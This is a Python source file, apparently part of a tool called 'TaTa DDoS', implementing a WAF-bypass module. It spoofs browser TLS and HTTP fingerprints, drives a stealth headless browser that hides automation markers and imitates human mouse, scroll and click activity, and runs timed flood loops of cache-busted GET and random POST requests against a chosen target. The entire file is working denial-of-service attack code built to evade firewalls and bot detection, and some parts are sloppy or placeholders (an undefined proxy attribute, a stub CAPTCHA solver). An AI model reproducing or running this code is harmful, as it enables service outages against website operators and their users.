#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TaTa DDoS - WAF Bypass Module
# By nezX - https://github.com/nezX-project/tata-ddos

import asyncio
import random
import time
import json
import ssl
import socket
import hashlib
from typing import Optional, Dict, List, Any
from dataclasses import dataclass
from playwright.async_api import async_playwright, Browser, Page, BrowserContext
import aiohttp
from aiohttp import ClientSession, TCPConnector
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import subprocess
import os

# JA3 fingerprint database - TLS handshake signatures of popular browsers
JA3_FINGERPRINTS = {
    'chrome_120': {
        'tls_versions': [0x0303, 0x0302, 0x0301],
        'ciphers': [
            0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F, 0xC02C, 0xC030,
            0xCCA9, 0xCCA8, 0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035
        ],
        'extensions': ['server_name', 'supported_groups', 'ec_point_formats', 
                      'session_ticket', 'application_layer_protocol_negotiation',
                      'status_request', 'signature_algorithms', 'key_share',
                      'psk_key_exchange_modes', 'supported_versions']
    },
    'firefox_122': {
        'tls_versions': [0x0303, 0x0302, 0x0301],
        'ciphers': [
            0x1301, 0x1302, 0x1303, 0xC02B, 0xC02C, 0xCCA8, 0xCCA9,
            0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035
        ],
        'extensions': ['server_name', 'supported_groups', 'ec_point_formats',
                      'session_ticket', 'application_layer_protocol_negotiation',
                      'status_request', 'signature_algorithms', 'key_share',
                      'psk_key_exchange_modes', 'supported_versions']
    },
    'safari_17': {
        'tls_versions': [0x0303, 0x0302, 0x0301],
        'ciphers': [
            0x1301, 0x1302, 0x1303, 0xC02B, 0xC02C, 0xCCA8, 0xCCA9,
            0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035
        ],
        'extensions': ['server_name', 'supported_groups', 'ec_point_formats',
                      'session_ticket', 'application_layer_protocol_negotiation',
                      'status_request', 'signature_algorithms', 'key_share']
    },
    'edge_120': {
        'tls_versions': [0x0303, 0x0302, 0x0301],
        'ciphers': [
            0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F, 0xC02C, 0xC030,
            0xCCA9, 0xCCA8, 0xC013, 0xC014, 0x009C, 0x009D, 0x002F, 0x0035
        ],
        'extensions': ['server_name', 'supported_groups', 'ec_point_formats',
                      'session_ticket', 'application_layer_protocol_negotiation',
                      'status_request', 'signature_algorithms', 'key_share']
    }
}

# User-Agent strings matching JA3 fingerprints
USER_AGENTS = {
    'chrome_120': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'firefox_122': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'safari_17': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'edge_120': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
}

class JA3Spoofer:
    """Spoof JA3/TLS fingerprints"""
    
    def __init__(self, browser_type: str = 'chrome_120'):
        self.browser_type = browser_type
        self.fingerprint = JA3_FINGERPRINTS.get(browser_type, JA3_FINGERPRINTS['chrome_120'])
        self.user_agent = USER_AGENTS.get(browser_type, USER_AGENTS['chrome_120'])
    
    def get_tls_context(self) -> ssl.SSLContext:
        """Create SSL context mimicking target browser"""
        context = ssl.create_default_context()
        
        # Set TLS versions
        if 0x0303 in self.fingerprint['tls_versions']:  # TLS 1.3
            context.minimum_version = ssl.TLSVersion.TLSv1_3
            context.maximum_version = ssl.TLSVersion.TLSv1_3
        elif 0x0302 in self.fingerprint['tls_versions']:  # TLS 1.2
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            context.maximum_version = ssl.TLSVersion.TLSv1_2
        
        # Cipher suites (simplified - Python doesn't allow exact cipher control)
        # But we can set acceptable ciphers
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        
        return context
    
    def spoof_http2_settings(self) -> Dict[str, int]:
        """Return HTTP/2 SETTINGS frame mimicking browser"""
        # Chrome's typical SETTINGS
        return {
            'SETTINGS_HEADER_TABLE_SIZE': 65536,
            'SETTINGS_ENABLE_PUSH': 0,
            'SETTINGS_MAX_CONCURRENT_STREAMS': 1000,
            'SETTINGS_INITIAL_WINDOW_SIZE': 6291456,
            'SETTINGS_MAX_FRAME_SIZE': 16384,
            'SETTINGS_MAX_HEADER_LIST_SIZE': 262144
        }
    
    def get_http_headers(self) -> Dict[str, str]:
        """Get HTTP headers matching browser"""
        return {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
    
    def get_random_ja3(self) -> str:
        """Generate a random JA3 hash (for testing)"""
        # Simplified JA3 generation - just a random hex string
        return hashlib.md5(f"{self.browser_type}_{time.time()}_{random.randint(1,1000)}".encode()).hexdigest()

class BrowserAutomation:
    """Headless browser automation for WAF bypass"""
    
    def __init__(self, browser_type: str = 'chrome_120', headless: bool = True, 
                 captcha_key: Optional[str] = None, proxy: Optional[Dict] = None):
        self.browser_type = browser_type
        self.headless = headless
        self.captcha_key = captcha_key
        self.proxy = proxy
        self.browser: Optional[Browser] = None
        self.context: Optional[BrowserContext] = None
        self.page: Optional[Page] = None
        self.playwright = None
        
    async def start(self):
        """Launch browser instance"""
        self.playwright = await async_playwright().start()
        
        # Browser launch options
        launch_options = {
            'headless': self.headless,
            'args': [
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-gpu',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-features=BlockInsecurePrivateNetworkRequests',
            ]
        }
        
        # Proxy support
        if self.proxy:
            proxy_str = f"{self.proxy['ip']}:{self.proxy['port']}"
            if self.proxy.get('user') and self.proxy.get('pass'):
                proxy_str = f"{self.proxy['user']}:{self.proxy['pass']}@{proxy_str}"
            
            launch_options['proxy'] = {
                'server': f"{self.proxy_type}://{proxy_str}" if self.proxy_type else f"socks5://{proxy_str}"
            }
        
        # Launch browser
        if self.browser_type == 'firefox':
            self.browser = await self.playwright.firefox.launch(**launch_options)
        else:
            self.browser = await self.playwright.chromium.launch(**launch_options)
        
        # Create context with realistic viewport and user agent
        context_options = {
            'viewport': {'width': random.choice([1366, 1920, 1536]), 'height': 768},
            'user_agent': USER_AGENTS.get(self.browser_type, USER_AGENTS['chrome_120']),
            'locale': 'en-US',
            'timezone_id': 'America/New_York',
            'permissions': ['geolocation'],
            'geolocation': {'latitude': 40.7128, 'longitude': -74.0060},
            'device_scale_factor': 1,
            'has_touch': False,
            'is_mobile': False,
            'extra_http_headers': {
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Ch-Ua': f'"Not_A Brand";v="8", "Chromium";v="120", "{self.browser_type}";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            }
        }
        
        self.context = await self.browser.new_context(**context_options)
        self.page = await self.context.new_page()
        
        # Inject stealth scripts
        await self._inject_stealth()
        
        return self.page
    
    async def _inject_stealth(self):
        """Inject JavaScript to hide automation markers"""
        stealth_js = """
        // Remove webdriver property
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // Spoof plugins
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        
        // Spoof languages
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        // Remove Playwright/Chromium markers
        window.navigator.chrome = { runtime: {} };
        window.navigator.permissions.query = (params) => {
            if (params.name === 'notifications') {
                return Promise.resolve({ state: 'prompt' });
            }
            return Promise.resolve({ state: 'prompt' });
        };
        """
        await self.page.add_init_script(stealth_js)
    
    async def human_like_navigation(self, url: str, target: str, port: int):
        """Navigate with human-like behavior"""
        try:
            # Random pre-navigation delay
            await asyncio.sleep(random.uniform(0.5, 2.0))
            
            # Navigate to target
            full_url = f"https://{target}:{port}" if port == 443 else f"http://{target}:{port}"
            await self.page.goto(full_url, wait_until='networkidle', timeout=10000)
            
            # Random mouse movement simulation
            await self._simulate_mouse_movement()
            
            # Random scrolling
            await self._simulate_scrolling()
            
            # Random clicks (if elements exist)
            await self._simulate_clicks()
            
            # Wait for page load
            await asyncio.sleep(random.uniform(0.5, 3.0))
            
            # Handle potential CAPTCHA
            if self.captcha_key:
                await self._handle_captcha()
            
            return True
        except Exception as e:
            print(f"[!] Browser navigation error: {e}")
            return False
    
    async def _simulate_mouse_movement(self):
        """Simulate random mouse movements"""
        try:
            for _ in range(random.randint(3, 10)):
                x = random.randint(100, 1000)
                y = random.randint(100, 600)
                await self.page.mouse.move(x, y)
                await asyncio.sleep(random.uniform(0.01, 0.1))
        except:
            pass
    
    async def _simulate_scrolling(self):
        """Simulate random scrolling"""
        try:
            for _ in range(random.randint(2, 5)):
                scroll_amount = random.randint(100, 400)
                await self.page.evaluate(f"window.scrollBy(0, {scroll_amount})")
                await asyncio.sleep(random.uniform(0.1, 0.5))
        except:
            pass
    
    async def _simulate_clicks(self):
        """Simulate random clicks on visible elements"""
        try:
            # Get all clickable elements
            elements = await self.page.query_selector_all('a, button, input[type="submit"]')
            if elements and random.random() < 0.3:  # 30% chance to click
                element = random.choice(elements)
                await element.click()
                await asyncio.sleep(random.uniform(0.5, 1.5))
        except:
            pass
    
    async def _handle_captcha(self):
        """Handle CAPTCHA using 2captcha service"""
        if not self.captcha_key:
            return
        
        try:
            # Check if CAPTCHA exists
            captcha_elements = await self.page.query_selector_all('iframe[src*="recaptcha"], .g-recaptcha, #captcha')
            if captcha_elements:
                print("[*] CAPTCHA detected, solving...")
                # In a real implementation, you'd use 2captcha API
                # This is a placeholder
                await asyncio.sleep(2)
        except:
            pass
    
    async def flood_requests(self, target: str, port: int, count: int = 10):
        """Send multiple requests through browser context"""
        try:
            for i in range(count):
                # Random path with cache buster
                path = f"/{random.randint(1000, 9999)}?t={time.time()}&r={random.random()}"
                url = f"https://{target}:{port}{path}" if port == 443 else f"http://{target}:{port}{path}"
                
                # Random request method (mostly GET, some POST)
                if random.random() < 0.8:
                    response = await self.page.goto(url, wait_until='networkidle', timeout=5000)
                else:
                    # POST with random data
                    data = {'key': hashlib.md5(str(random.random()).encode()).hexdigest()}
                    response = await self.page.evaluate(f"""
                        fetch('{url}', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                            body: '{json.dumps(data)}'
                        }})
                    """)
                
                # Random delay between requests
                await asyncio.sleep(random.uniform(0.1, 1.0))
                
                # If WAF blocks, bail out
                if response and hasattr(response, 'status') and response.status in [403, 429, 503]:
                    print(f"[!] WAF blocked request {i}")
                    break
        except Exception as e:
            print(f"[!] Flood request error: {e}")
    
    async def close(self):
        """Clean up browser resources"""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()

class WAFBypassManager:
    """Manage WAF bypass techniques"""
    
    def __init__(self, browser_type: str = 'chrome_120', 
                 ja3_spoof: bool = True,
                 headless: bool = True,
                 captcha_key: Optional[str] = None,
                 proxy: Optional[Dict] = None):
        
        self.browser_type = browser_type
        self.ja3_spoof = ja3_spoof
        self.headless = headless
        self.captcha_key = captcha_key
        self.proxy = proxy
        
        self.ja3_spoofer = JA3Spoofer(browser_type) if ja3_spoof else None
        self.browser_automation = None
        self.session = None
        
    async def initialize(self):
        """Initialize bypass tools"""
        self.browser_automation = BrowserAutomation(
            browser_type=self.browser_type,
            headless=self.headless,
            captcha_key=self.captcha_key,
            proxy=self.proxy
        )
        await self.browser_automation.start()
        
        # Also setup aiohttp session with JA3 spoofing if available
        if self.ja3_spoofer:
            connector = TCPConnector(ssl=self.ja3_spoofer.get_tls_context() if self.ja3_spoofer else None)
            self.session = ClientSession(connector=connector)
            self.session.headers.update(self.ja3_spoofer.get_http_headers() if self.ja3_spoofer else {})
        
        return self.browser_automation.page
    
    async def attack_with_bypass(self, target: str, port: int, duration: int):
        """Execute attack with WAF bypass techniques"""
        if not self.browser_automation:
            await self.initialize()
        
        start_time = time.time()
        attack_count = 0
        
        while time.time() - start_time < duration:
            try:
                # First navigate like a human
                if attack_count % 5 == 0:  # Every 5 requests, do full navigation
                    await self.browser_automation.human_like_navigation(
                        f"https://{target}:{port}" if port == 443 else f"http://{target}:{port}",
                        target, port
                    )
                
                # Send flood requests through browser
                await self.browser_automation.flood_requests(target, port, count=random.randint(5, 15))
                
                # Use aiohttp session for additional requests (with JA3 spoofing)
                if self.session and attack_count % 3 != 0:
                    await self._send_aiohttp_request(target, port)
                
                attack_count += 1
                
                # Random pause to simulate human behavior
                await asyncio.sleep(random.uniform(0.5, 2.5))
                
            except Exception as e:
                print(f"[!] Bypass attack error: {e}")
                # Reinitialize browser if it crashed
                if "closed" in str(e).lower() or "browser" in str(e).lower():
                    await self.browser_automation.close()
                    await self.initialize()
        
        return attack_count
    
    async def _send_aiohttp_request(self, target: str, port: int):
        """Send request through aiohttp with JA3 spoofing"""
        try:
            url = f"https://{target}:{port}/?r={random.random()}" if port == 443 else f"http://{target}:{port}/?r={random.random()}"
            async with self.session.get(url) as resp:
                await resp.text()
                return resp.status
        except Exception as e:
            print(f"[!] aiohttp request error: {e}")
            return None
    
    async def close(self):
        """Clean up resources"""
        if self.browser_automation:
            await self.browser_automation.close()
        if self.session:
            await self.session.close()
